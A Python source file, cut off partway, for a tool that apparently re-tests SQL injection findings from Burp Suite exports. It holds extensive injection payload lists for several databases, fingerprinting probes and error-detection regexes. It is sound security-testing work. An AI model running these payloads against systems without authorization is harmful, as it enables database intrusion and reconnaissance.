#!/usr/bin/env python3
"""
Burp SQL Injection Verification Tool v2.5

Purpose:
    Re-test SQL Injection findings exported from Burp Suite XML and classify each
    finding as TRUE_POSITIVE, FALSE_POSITIVE, or UNREACHABLE using bounded, non-destructive
    verification payloads.

Important:
    Run only against systems where you have explicit authorization.

Default files:
    BURP_XML_FILE     = "burp_report.xml"
    OUTPUT_XML_FILE   = "sqli_test_results.xml"
    LOCAL_PAYLOAD_DIR = "payloads"

Recommended payload file format:
    payloads/<category>.txt
    One payload per line.
    Use ## for comments.
    Do NOT use Markdown for local payload files.
"""

from __future__ import annotations

import argparse
import base64
import html
import os
import re
import sys
import time
import traceback
import urllib.parse
import warnings
import xml.etree.ElementTree as ET
from collections import OrderedDict
from dataclasses import dataclass, field
from http.cookies import SimpleCookie
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Tuple

import requests
from requests import Response, Session
from urllib3.exceptions import InsecureRequestWarning


# =============================================================================
# CONFIG
# =============================================================================

BURP_XML_FILE = "burp_report.xml"
OUTPUT_XML_FILE = "sqli_test_results.xml"
LOCAL_PAYLOAD_DIR = "payloads"

MAX_PAYLOADS_PER_CATEGORY = 5
PAYLOAD_DOWNLOAD_TIMEOUT = 10
HTTP_TIMEOUT = 12
TARGET_VERIFY_SSL = False  # intentionally disabled for labs/self-signed targets
GITHUB_VERIFY_SSL = True
TIME_DELAY_THRESHOLD_SECONDS = 4.0
BOOLEAN_MIN_ABSOLUTE_SIZE_DELTA = 30
BOOLEAN_MIN_RELATIVE_SIZE_DELTA = 0.05
TRUE_POSITIVE_SCORE_THRESHOLD = 80
FALSE_POSITIVE_SCORE_THRESHOLD = 40
RELIABILITY_SCORE_THRESHOLD = 70
BASELINE_SAMPLE_COUNT = 2
RESPONSE_SNIPPET_CHARS = 300
BASELINE_DEFAULT_VALUE = "1"
REDACTED_VALUE = "[REDACTED]"
SECRET_HEADERS = {"cookie", "authorization", "x-api-key", "x-csrf-token", "x-xsrf-token"}
USER_AGENT = "BurpSQLiVerifier/2.5"

GITHUB_SQLI_BASE_URL = (
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/"
    "master/SQL%20Injection/"
)

# Local category files. These are the files YOU keep in ./payloads.
CATEGORY_FILES: "OrderedDict[str, str]" = OrderedDict(
    [
        ("union_based", "union_based.txt"),
        ("error_based", "error_based.txt"),
        ("boolean_blind", "boolean_blind.txt"),
        ("time_blind", "time_blind.txt"),
        ("stacked_queries", "stacked_queries.txt"),
    ]
)

# Optional remote source files. They are used only when --refresh-payloads is set
# or when local files are missing and --allow-github is set.
# PayloadsAllTheThings does not provide union_based.txt/error_based.txt/etc.
# It keeps SQLi payloads under SQL Injection/Intruder and in Markdown docs.
REMOTE_CATEGORY_FILES: Dict[str, str] = {
    "union_based": "Intruder/Generic_UnionSelect.txt",
    "error_based": "Intruder/Generic_ErrorBased.txt",
    "boolean_blind": "Intruder/SQL-Injection",
    "time_blind": "Intruder/Generic_TimeBased.txt",
    "stacked_queries": "Intruder/SQL-Injection",
}

DBMS_TYPES = ("generic", "mysql", "postgresql", "mssql", "oracle", "sqlite")
DBMS_SPECIFIC_DIRS = {
    "mysql": "mysql",
    "postgresql": "postgresql",
    "mssql": "mssql",
    "oracle": "oracle",
    "sqlite": "sqlite",
}

# PayloadsAllTheThings keeps engine-specific SQL Injection payloads in Markdown files
# and generic Intruder payloads in SQL Injection/Intruder. Local scanner files stay .txt.
REMOTE_DBMS_DOC_FILES: Dict[str, str] = {
    "mysql": "MySQL Injection.md",
    "postgresql": "PostgreSQL Injection.md",
    "mssql": "MSSQL Injection.md",
    "oracle": "OracleSQL Injection.md",
    "sqlite": "SQLite Injection.md",
}

DBMS_PASSIVE_PATTERNS: Dict[str, List[str]] = {
    "mysql": [
        r"mysql", r"mariadb", r"you have an error in your sql syntax",
        r"sql syntax.*mysql", r"mysql server version", r"mysqli?[_ .]",
    ],
    "postgresql": [
        r"postgresql", r"postgres", r"psqlexception", r"pg_query",
        r"syntax error at or near", r"unterminated quoted string",
    ],
    "mssql": [
        r"mssql", r"sql server", r"microsoft ole db provider for sql server",
        r"sql server native client", r"unclosed quotation mark", r"incorrect syntax near",
    ],
    "oracle": [
        r"oracle", r"ora-[0-9]{5}", r"quoted string not properly terminated",
        r"sql command not properly ended", r"oracle.*driver",
    ],
    "sqlite": [
        r"sqlite", r"sqlite/jdbcdriver", r"sqliteexception", r"sqlite error",
        r"sqlite_master", r"sqlite_schema",
    ],
}
COMPILED_DBMS_PASSIVE_PATTERNS = {
    dbms: [re.compile(pattern, re.IGNORECASE | re.MULTILINE) for pattern in patterns]
    for dbms, patterns in DBMS_PASSIVE_PATTERNS.items()
}

DBMS_VERSION_PATTERNS: Dict[str, List[str]] = {
    "mysql": [r"(?:mysql|mariadb)\s*(?:server\s*)?version[^0-9]{0,20}([0-9]+(?:\.[0-9]+){1,3})"],
    "postgresql": [r"postgresql[^0-9]{0,20}([0-9]+(?:\.[0-9]+){0,3})"],
    "mssql": [r"(?:microsoft\s+)?sql server\s*(?:version)?[^0-9]{0,40}([0-9]+(?:\.[0-9]+){0,3})"],
    "oracle": [r"oracle[^0-9]{0,30}([0-9]+(?:\.[0-9]+){0,4})", r"ora-[0-9]{5}"],
    "sqlite": [r"sqlite[^0-9]{0,20}([0-9]+(?:\.[0-9]+){1,3})"],
}
COMPILED_DBMS_VERSION_PATTERNS = {
    dbms: [re.compile(pattern, re.IGNORECASE | re.MULTILINE) for pattern in patterns]
    for dbms, patterns in DBMS_VERSION_PATTERNS.items()
}

# Fingerprinting is intentionally conservative: first use Burp/app evidence, then
# use harmless boolean/error/time probes. It does not dump schemas or data.
DBMS_FINGERPRINT_PAYLOADS: Dict[str, List[Tuple[str, str]]] = {
    "mysql": [
        ("error", "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -"),
        ("time", "' AND SLEEP(3)-- -"),
        ("boolean", "' AND @@version IS NOT NULL-- -"),
    ],
    "postgresql": [
        ("error", "' AND CAST(version() AS int)-- -"),
        ("time", "'; SELECT pg_sleep(3)--"),
        ("boolean", "' AND version() IS NOT NULL-- -"),
    ],
    "mssql": [
        ("error", "' AND 1=CONVERT(int,@@version)-- -"),
        ("time", "'; WAITFOR DELAY '0:0:3'--"),
        ("boolean", "' AND @@version IS NOT NULL-- -"),
    ],
    "oracle": [
        ("error", "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"),
        ("time", "' AND DBMS_PIPE.RECEIVE_MESSAGE('SQLI',3)=1--"),
        ("boolean", "' AND (SELECT 1 FROM dual)=1--"),
    ],
    "sqlite": [
        ("error", "' AND CAST(sqlite_version() AS int)-- -"),
        ("boolean", "' AND sqlite_version() IS NOT NULL-- -"),
    ],
}

DB_ERROR_PATTERNS = [
    # Generic
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"SQLSTATE\[[0-9A-Z]+\]",
    r"syntax error",
    r"unterminated quoted string",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"database error",
    r"SQL command not properly ended",
    r"ODBC SQL Server Driver",
    r"JDBC SQL",
    r"SQLite/JDBCDriver",
    r"System\.Data\.SqlClient\.SqlException",
    # MySQL / MariaDB
    r"You have an error in your SQL syntax",
    r"mysqli?_fetch",
    r"mysqli?_num_rows",
    r"MariaDB server version",
    r"MySQL server version",
    r"supplied argument is not a valid MySQL",
    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"ERROR:\s+syntax error at or near",
    r"org\.postgresql\.util\.PSQLException",
    # Oracle
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"quoted string not properly terminated",
    # MSSQL
    r"Microsoft OLE DB Provider for SQL Server",
    r"Microsoft SQL Native Client error",
    r"SQL Server Native Client",
    r"SQL Server.*Driver",
    r"Incorrect syntax near",
    r"Unclosed quotation mark after the character string",
]

COMPILED_DB_ERROR_PATTERNS = [re.compile(p, re.IGNORECASE | re.MULTILINE) for p in DB_ERROR_PATTERNS]

# Conservative fallback payloads. These are verification payloads, not destructive payloads.
FALLBACK_PAYLOADS: Dict[str, List[str]] = {
    "union_based": [
        "' UNION SELECT 'SQLI_UNION_MARKER'-- -",
        "' UNION SELECT NULL,'SQLI_UNION_MARKER'-- -",
        "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER'-- -",
        "') UNION SELECT 'SQLI_UNION_MARKER'-- -",
        "\") UNION SELECT 'SQLI_UNION_MARKER'-- -",
    ],
    "error_based": [
        "'",
        '"',
        "')",
        "' AND 1=CONVERT(int,'SQLI_ERROR_TEST')-- -",
        "' AND extractvalue(1,concat(0x7e,'SQLI_ERROR_TEST',0x7e))-- -",
    ],
    "boolean_blind": [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' OR '1'='1'-- -",
        "' OR '1'='2'-- -",
        "\" AND 1=1-- -",
        "\" AND 1=2-- -",
    ],
    "time_blind": [
        "' AND SLEEP(5)-- -",
        "'+(select*from(select(sleep(5)))a)+'",
        "'; SELECT pg_sleep(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('SQLI',5)=1--",
    ],
    "stacked_queries": [
        "'; SELECT 1-- -",
        "'; SELECT NULL-- -",
        "'; SELECT SLEEP(5)-- -",
        "'; SELECT pg_sleep(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
}


DBMS_SPECIFIC_FALLBACK_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "mysql": {
        "union_based": [
            "' UNION SELECT 'SQLI_UNION_MARKER'-- -",
            "' UNION SELECT NULL,'SQLI_UNION_MARKER'-- -",
            "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER'-- -",
            "' UNION SELECT 'SQLI_UNION_MARKER'#",
            "') UNION SELECT 'SQLI_UNION_MARKER'-- -",
        ],
        "error_based": [
            "'",
            "' AND extractvalue(1,concat(0x7e,'SQLI_ERROR_TEST',0x7e))-- -",
            "' AND updatexml(1,concat(0x7e,'SQLI_ERROR_TEST',0x7e),1)-- -",
            "' AND GTID_SUBSET(CONCAT(0x7e,'SQLI_ERROR_TEST',0x7e),1337)-- -",
            "' AND exp(~(SELECT * FROM (SELECT CONCAT(0x7e,'SQLI_ERROR_TEST',0x7e))x))-- -",
        ],
        "boolean_blind": [
            "' AND 1=1-- -",
            "' AND 1=2-- -",
            "' OR '1'='1'-- -",
            "' OR '1'='2'-- -",
            "' AND IF(1=1,1,0)-- -",
            "' AND IF(1=2,1,0)-- -",
        ],
        "time_blind": [
            "' AND SLEEP(5)-- -",
            "' OR SLEEP(5)-- -",
            "' AND IF(1=1,SLEEP(5),0)-- -",
            "'+(select*from(select(sleep(5)))a)+'",
            "' AND BENCHMARK(5000000,MD5(1))-- -",
        ],
        "stacked_queries": [
            "'; SELECT 1-- -",
            "'; SELECT NULL-- -",
            "'; SELECT SLEEP(5)-- -",
            "'; DO SLEEP(5)-- -",
            "'; SELECT VERSION()-- -",
        ],
    },
    "postgresql": {
        "union_based": [
            "' UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT NULL,'SQLI_UNION_MARKER'--",
            "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER'--",
            "') UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT version()--",
        ],
        "error_based": [
            "'",
            "' AND CAST('SQLI_ERROR_TEST' AS int)--",
            "' AND CAST(version() AS int)--",
            "' AND 1=CAST('SQLI_ERROR_TEST' AS int)--",
            "' AND to_number('SQLI_ERROR_TEST','999')=1--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1'--",
            "' OR '1'='2'--",
            "' AND version() IS NOT NULL--",
        ],
        "time_blind": [
            "'; SELECT pg_sleep(5)--",
            "' OR pg_sleep(5) IS NULL--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "' AND (SELECT 1 FROM pg_sleep(5))=1--",
        ],
        "stacked_queries": [
            "'; SELECT 1--",
            "'; SELECT NULL--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT version()--",
            "'; SELECT current_database()--",
        ],
    },
    "mssql": {
        "union_based": [
            "' UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT NULL,'SQLI_UNION_MARKER'--",
            "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER'--",
            "') UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT @@version--",
        ],
        "error_based": [
            "'",
            "' AND 1=CONVERT(int,'SQLI_ERROR_TEST')--",
            "' AND 1=CAST('SQLI_ERROR_TEST' AS int)--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=(SELECT CONVERT(int,'SQLI_ERROR_TEST'))--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1'--",
            "' OR '1'='2'--",
            "' AND @@version IS NOT NULL--",
        ],
        "time_blind": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "'; IF (SELECT COUNT(*) FROM sysobjects) >= 0 WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR TIME '23:59:59'--",
        ],
        "stacked_queries": [
            "'; SELECT 1--",
            "'; SELECT NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT @@version--",
            "'; SELECT DB_NAME()--",
        ],
    },
    "oracle": {
        "union_based": [
            "' UNION SELECT 'SQLI_UNION_MARKER' FROM dual--",
            "' UNION SELECT NULL,'SQLI_UNION_MARKER' FROM dual--",
            "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER' FROM dual--",
            "') UNION SELECT 'SQLI_UNION_MARKER' FROM dual--",
            "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
        ],
        "error_based": [
            "'",
            "' AND 1=TO_NUMBER('SQLI_ERROR_TEST')--",
            "' AND CTXSYS.DRITHSX.SN(1,'SQLI_ERROR_TEST')=1--",
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('SQLI_ERROR_TEST')--",
            "' AND 1=(SELECT TO_NUMBER('SQLI_ERROR_TEST') FROM dual)--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1'--",
            "' OR '1'='2'--",
            "' AND (SELECT 1 FROM dual)=1--",
        ],
        "time_blind": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('SQLI',5)=1--",
            "' AND 1=(CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('SQLI',5) ELSE 1 END)--",
            "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('SQLI',5) ELSE 1 END FROM dual)--",
            "' AND UTL_INADDR.GET_HOST_ADDRESS('10.255.255.1') IS NULL--",
            "' AND DBMS_LOCK.SLEEP(5) IS NULL--",
        ],
        "stacked_queries": [
            "'; SELECT 1 FROM dual--",
            "'; SELECT NULL FROM dual--",
            "'; SELECT banner FROM v$version WHERE ROWNUM=1--",
            "'; BEGIN NULL; END;--",
            "'; SELECT USER FROM dual--",
        ],
    },
    "sqlite": {
        "union_based": [
            "' UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT NULL,'SQLI_UNION_MARKER'--",
            "' UNION ALL SELECT NULL,NULL,'SQLI_UNION_MARKER'--",
            "') UNION SELECT 'SQLI_UNION_MARKER'--",
            "' UNION SELECT sqlite_version()--",
        ],
        "error_based": [
            "'",
            "' AND CAST('SQLI_ERROR_TEST' AS int)--",
            "' AND 1=CAST(sqlite_version() AS int)--",
            "' AND load_extension('SQLI_ERROR_TEST')--",
            "' AND 1=(SELECT CAST('SQLI_ERROR_TEST' AS int))--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1'--",
            "' OR '1'='2'--",
            "' AND sqlite_version() IS NOT NULL--",
        ],
        "time_blind": [
            "' AND randomblob(50000000) IS NOT NULL--",
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000))))--",
            "' OR randomblob(50000000) IS NOT NULL--",
            "' AND 1=(SELECT 1 FROM sqlite_master WHERE randomblob(50000000) IS NOT NULL)--",
            "' AND 1=1--",
        ],
        "stacked_queries": [
            "'; SELECT 1--",
            "'; SELECT NULL--",
            "'; SELECT sqlite_version()--",
            "'; SELECT name FROM sqlite_master LIMIT 1--",
            "'; SELECT 1 WHERE 1=1--",
        ],
    },
}


# =============================================================================
# CONSOLE
# =============================================================================

class Console:
    """Small console helper with ANSI colors when stdout is a terminal."""

    def __init__(self, no_color: bool = False) -> None:
        self.use_color = sys.stdout.isatty() and not no_color

    def _c(self, text: str, code: str) -> str:
        if not self.use_color:
            return text
        return f"\033[{code}m{text}\033[0m"

    def info(self, msg: str) -> None:
        print(self._c(f"[*] {msg}", "36"))

    def ok(self, msg: str) -> None:
        print(self._c(f"[+] {msg}", "32"))

    def warn(self, msg: str) -> None:
        print(self._c(f"[!] {msg}", "33"))

    def error(self, msg: str) -> None:
        print(self._c(f"[-] {msg}", "31"))

    def tp(self, msg: str) -> None:
        print(self._c(f"[TP] {msg}", "32;1"))

    def fp(self, msg: str) -> None:
        print(self._c(f"[FP] {msg}", "33;1"))

    def banner(self, msg: str) -> None:
        print(self._c(f"\n=== {msg} ===", "35;1"))


# =============================================================================
# DATA MODELS
# =============================================================================

@dataclass
class ParsedRequest:
    method: str
    path: str
    http_version: str
    headers: Dict[str, str]
    body: str
    raw: str


@dataclass
class Finding:
    serial_number: str
    url: str
    method: str
    parameter: str
    severity: str
    confidence: str
    issue_name: str
    issue_detail: str
    original_requests: List[str] = field(default_factory=list)
    original_responses: List[str] = field(default_factory=list)
    parsed_request: Optional[ParsedRequest] = None


@dataclass
class PayloadResult:
    category: str
    payload: str
    status_code: Optional[int]
    response_size: int
    response_time: float
    full_request_sent: str
    response_snippet: str
    response_body: str = field(default="", repr=False)
    error: Optional[str] = None
    evidence: List[str] = field(default_factory=list)


@dataclass
class FingerprintResult:
    dbms: str = "generic"
    confidence: str = "unknown"
    source: str = "none"
    version: str = ""
    evidence: List[str] = field(default_factory=list)


@dataclass
class EvidenceSignal:
    signal_type: str
    score: int
    reason: str
    category: str = ""
    payload: str = ""
    status_code: Optional[int] = None
    response_size: int = 0
    response_time: float = 0.0


@dataclass
class ReliabilityPenalty:
    penalty_type: str
    points: int
    reason: str


@dataclass
class ScoringSummary:
    evidence_score: int = 0
    reliability_score: int = 100
    confidence: str = "unknown"
    enough_tests_completed: bool = False
    tests_completed: int = 0
    categories_completed: List[str] = field(default_factory=list)
    signals: List[EvidenceSignal] = field(default_factory=list)
    penalties: List[ReliabilityPenalty] = field(default_factory=list)


@dataclass
class TestResult:
    finding: Finding
    classification: str
    verdict: str
    baseline_status: Optional[int]
    baseline_size: int
    baseline_time: float
    payload_results: List[PayloadResult]
    errors: List[str] = field(default_factory=list)
    fingerprint: FingerprintResult = field(default_factory=FingerprintResult)
    scoring: ScoringSummary = field(default_factory=ScoringSummary)


# =============================================================================
# UTILS
# =============================================================================

def clean_xml_bytes(raw: bytes) -> bytes:
    """Remove XML-breaking NULL bytes that Burp can preserve in request/response bodies."""
    return raw.replace(b"\x00", b"")


def text_or_empty(node: Optional[ET.Element]) -> str:
    return "" if node is None or node.text is None else node.text


def decode_burp_blob(node: Optional[ET.Element]) -> str:
    if node is None:
        return ""
    data = node.text or ""
    is_base64 = (node.attrib.get("base64", "false").lower() == "true")
    if is_base64:
        try:
            return base64.b64decode(data).decode("utf-8", errors="replace")
        except Exception:
            return data
    return data


def strip_html_tags(value: str) -> str:
    value = re.sub(r"<[^>]+>", " ", value)
    value = html.unescape(value)
    return re.sub(r"\s+", " ", value).strip()


def parse_raw_http_request(raw_request: str) -> Optional[ParsedRequest]:
    if not raw_request.strip():
        return None

    normalized = raw_request.replace("\r\n", "\n")
    if "\n\n" in normalized:
        header_part, body = normalized.split("\n\n", 1)
    else:
        header_part, body = normalized, ""

    lines = header_part.split("\n")
    if not lines:
        return None

    request_line = lines[0].strip()
    parts = request_line.split()
    if len(parts) < 2:
        return None

    method = parts[0].upper()
    path = parts[1]
    http_version = parts[2] if len(parts) >= 3 else "HTTP/1.1"

    headers: Dict[str, str] = {}
    current_name: Optional[str] = None
    for line in lines[1:]:
        if not line:
            continue
        if line.startswith((" ", "\t")) and current_name:
            headers[current_name] += " " + line.strip()
            continue
        if ":" in line:
            name, value = line.split(":", 1)
            current_name = name.strip()
            headers[current_name] = value.strip()

    return ParsedRequest(
        method=method,
        path=path,
        http_version=http_version,
        headers=headers,
        body=body,
        raw=raw_request,
    )


def header_get(headers: Dict[str, str], name: str, default: str = "") -> str:
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return default


def remove_hop_by_hop_headers(headers: Dict[str, str]) -> Dict[str, str]:
    blocked = {
        "host",
        "content-length",
        "transfer-encoding",
        "connection",
        "accept-encoding",  # let requests handle decompression cleanly
        "cookie",  # loaded into requests.Session cookies instead
        "proxy-connection",
    }
    cleaned: Dict[str, str] = {}
    for name, value in headers.items():
        if name.lower() not in blocked:
            cleaned[name] = value
    if "User-Agent" not in cleaned and "user-agent" not in {k.lower() for k in cleaned}:
        cleaned["User-Agent"] = USER_AGENT
    return cleaned


def parse_cookie_header(cookie_header: str) -> Dict[str, str]:
    cookies: Dict[str, str] = {}
    if not cookie_header:
        return cookies
    try:
        jar = SimpleCookie()
        jar.load(cookie_header)
        for key, morsel in jar.items():
            cookies[key] = morsel.value
    except Exception:
        for part in cookie_header.split(";"):
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
    return cookies


def parse_extra_headers(header_lines: Iterable[str]) -> Dict[str, str]:
    """Parse repeatable CLI --header values into a dictionary.

    Example:
        --header "Authorization: Bearer TOKEN"
        --header "X-Tenant: demo"
    """
    headers: Dict[str, str] = {}
    for raw in header_lines or []:
        if not raw or ":" not in raw:
            continue
        name, value = raw.split(":", 1)
        name = name.strip()
        value = value.strip()
        if not name:
            continue
        # Never allow user-supplied length/transfer headers; requests computes them.
        if name.lower() in {"content-length", "transfer-encoding", "connection", "proxy-connection"}:
            continue
        headers[name] = value
    return headers


def pop_header_case_insensitive(headers: Dict[str, str], name: str) -> Optional[str]:
    for key in list(headers.keys()):
        if key.lower() == name.lower():
            return headers.pop(key)
    return None


def redact_header_value(name: str, value: str, include_secrets: bool = False) -> str:
    if include_secrets:
        return value
    return REDACTED_VALUE if name.lower() in SECRET_HEADERS else value


def redact_raw_http_request(raw_request: str, include_secrets: bool = False) -> str:
    """Redact sensitive request headers in original Burp evidence by default."""
    if include_secrets or not raw_request:
        return raw_request

    normalized = raw_request.replace("\r\n", "\n")
    lines = normalized.split("\n")
    redacted: List[str] = []
    in_headers = True
    for line in lines:
        if in_headers and line == "":
            in_headers = False
            redacted.append(line)
            continue
        if in_headers and ":" in line and not line.startswith((" ", "\t")):
            name, value = line.split(":", 1)
            if name.lower() in SECRET_HEADERS:
                redacted.append(f"{name}: {REDACTED_VALUE}")
                continue
        redacted.append(line)
    return "\r\n".join(redacted)


def safe_baseline_value(original_value: str) -> str:
    """Try to turn a Burp attack value into a boring baseline value."""
    if not original_value:
        return BASELINE_DEFAULT_VALUE

    value = urllib.parse.unquote_plus(original_value)
    value = re.sub(r"(?i)(union|select|sleep|benchmark|pg_sleep|waitfor|delay|dbms_pipe|extractvalue|convert|concat).*", "", value)
    value = re.sub(r"(--|#|/\*|\*/|;).*", "", value)
    value = value.replace("'", "").replace('"', "").replace(")", "").replace("(", "")
    value = value.strip()
    return value or BASELINE_DEFAULT_VALUE


def response_text(resp: Response) -> str:
    try:
        return resp.text or ""
    except Exception:
        return resp.content.decode("utf-8", errors="replace")


def body_similarity_ratio(a: str, b: str) -> float:
    """Cheap similarity ratio without importing difflib for very large bodies."""
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    # Compare normalized prefixes to keep the calculation cheap.
    a2 = re.sub(r"\s+", " ", a[:5000])
    b2 = re.sub(r"\s+", " ", b[:5000])
    if a2 == b2:
        return 1.0
    # Use difflib only on capped strings.
    import difflib
    return difflib.SequenceMatcher(None, a2, b2).ratio()


def relative_delta(a: int, b: int) -> float:
    larger = max(abs(a), abs(b), 1)
    return abs(a - b) / larger


def extract_requested_delay_seconds(payload: str) -> float:
    p = payload or ""
    patterns = [
        r"(?i)sleep\s*\(\s*(\d+(?:\.\d+)?)",
        r"(?i)pg_sleep\s*\(\s*(\d+(?:\.\d+)?)",
        r"(?i)benchmark\s*\(\s*(\d+)",
        r"(?i)receive_message\s*\([^,]+,\s*(\d+(?:\.\d+)?)",
        r"(?i)waitfor\s+delay\s+['\"]0:0:(\d+(?:\.\d+)?)['\"]",
    ]
    for pattern in patterns:
        m = re.search(pattern, p)
        if m:
            try:
                value = float(m.group(1))
                # BENCHMARK count is not seconds; return the generic threshold.
                if "benchmark" in pattern.lower():
                    return 0.0
                return value
            except Exception:
                return 0.0
    return 0.0


def url_join_host_path(host: str, path: str) -> str:
    host = host.strip()
    path = path.strip()
    if not host:
        return path
    if not path.startswith("/") and not re.match(r"^https?://", path, re.I):
        path = "/" + path
    if re.match(r"^https?://", path, re.I):
        return path
    return host.rstrip("/") + path


def indent_xml(elem: ET.Element, level: int = 0) -> None:
    """Pretty-print XML for Python versions where ElementTree.indent may not exist."""
    i = "\n" + level * "  "
    if len(elem):
        if not elem.text or not elem.text.strip():
            elem.text = i + "  "
        for child in elem:
            indent_xml(child, level + 1)
        if not child.tail or not child.tail.strip():
            child.tail = i
    if level and (not elem.tail or not elem.tail.strip()):
        elem.tail = i


def looks_like_login_page(status_code: Optional[int], body: str, url: str = "") -> bool:
    if status_code in {301, 302, 303, 307, 308} and re.search(r"login|signin|auth", url, re.I):
        return True
    markers = [
        r"<title>.*login",
        r"name=[\"']username[\"']",
        r"name=[\"']password[\"']",
        r"please\s+login",
        r"login\s*::\s*damn vulnerable web application",
    ]
    return any(re.search(m, body, re.I) for m in markers)


def looks_like_waf_or_block_page(status_code: Optional[int], body: str) -> bool:
    if status_code in {403, 406, 429, 503}:
        markers = [
            r"access\s+denied",
            r"request\s+blocked",
            r"forbidden",
            r"web\s+application\s+firewall",
            r"mod_security",
            r"cloudflare",
            r"akamai",
            r"imperva",
            r"incapsula",
            r"sucuri",
        ]
        if any(re.search(m, body or "", re.I) for m in markers):
            return True
    return False


def normalize_dbms(value: str) -> str:
    raw = (value or "").strip().lower()
    aliases = {
        "postgres": "postgresql",
        "pgsql": "postgresql",
        "postgresql": "postgresql",
        "microsoft sql server": "mssql",
        "sql server": "mssql",
        "sqlserver": "mssql",
        "mssql": "mssql",
        "mysql": "mysql",
        "mariadb": "mysql",
        "oracle": "oracle",
        "oraclesql": "oracle",
        "sqlite": "sqlite",
        "sqlite3": "sqlite",
    }
    if raw in aliases:
        return aliases[raw]
    for key, val in aliases.items():
        if key in raw:
            return val
    return "generic"


def extract_dbms_version(dbms: str, text: str) -> str:
    dbms = normalize_dbms(dbms)
    for pattern in COMPILED_DBMS_VERSION_PATTERNS.get(dbms, []):
        m = pattern.search(text or "")
        if m:
            try:
                return m.group(1)
            except IndexError:
                return m.group(0)
    return ""


def passive_dbms_fingerprint(finding: Finding, baseline_body: str = "") -> FingerprintResult:
    """Infer DBMS from Burp issue details/responses or obvious app banners."""
    parts: List[str] = []
    if finding.issue_detail:
        parts.append(finding.issue_detail)
    parts.extend(finding.original_responses[:3])
    if baseline_body:
        parts.append(baseline_body)
    haystack = "\n".join(parts)

    # Burp often says: The database appears to be MySQL.
    m = re.search(r"database\s+appears\s+to\s+be\s+([A-Za-z0-9_ .-]+)", haystack, re.I)
    if m:
        dbms = normalize_dbms(m.group(1))
        if dbms != "generic":
            return FingerprintResult(
                dbms=dbms,
                confidence="high",
                source="burp_issue_detail",
                version=extract_dbms_version(dbms, haystack),
                evidence=[f"Burp issue detail says database appears to be {m.group(1).strip()}"],
            )

    # DVWA-style banner: SQLi DB: mysql
    m = re.search(r"SQLi\s*DB:\s*</?[^>]*>\s*([A-Za-z0-9_ .-]+)", haystack, re.I)
    if not m:
        m = re.search(r"SQLi\s*DB:\s*([A-Za-z0-9_ .-]+)", strip_html_tags(haystack), re.I)
    if m:
        dbms = normalize_dbms(m.group(1))
        if dbms != "generic":
            return FingerprintResult(
                dbms=dbms,
                confidence="high",
                source="application_banner",
                version=extract_dbms_version(dbms, haystack),
                evidence=[f"Application/banner indicates SQLi DB is {m.group(1).strip()}"],
            )

    hits: Dict[str, int] = {}
    matched: Dict[str, str] = {}
    for dbms, patterns in COMPILED_DBMS_PASSIVE_PATTERNS.items():
        for pattern in patterns:
            m = pattern.search(haystack)
            if m:
                hits[dbms] = hits.get(dbms, 0) + 1
                matched.setdefault(dbms, m.group(0)[:120])

    if hits:
        dbms = max(hits, key=hits.get)
        return FingerprintResult(
            dbms=dbms,
            confidence="medium" if hits[dbms] == 1 else "high",
            source="passive_error_or_banner",
            version=extract_dbms_version(dbms, haystack),
            evidence=[f"Passive DBMS pattern matched for {dbms}: {matched.get(dbms, '')}"],
        )

    return FingerprintResult(dbms="generic", confidence="unknown", source="none", evidence=["No passive DBMS fingerprint found"])


# =============================================================================
# BURP XML PARSER
# =============================================================================

class BurpXMLParser:
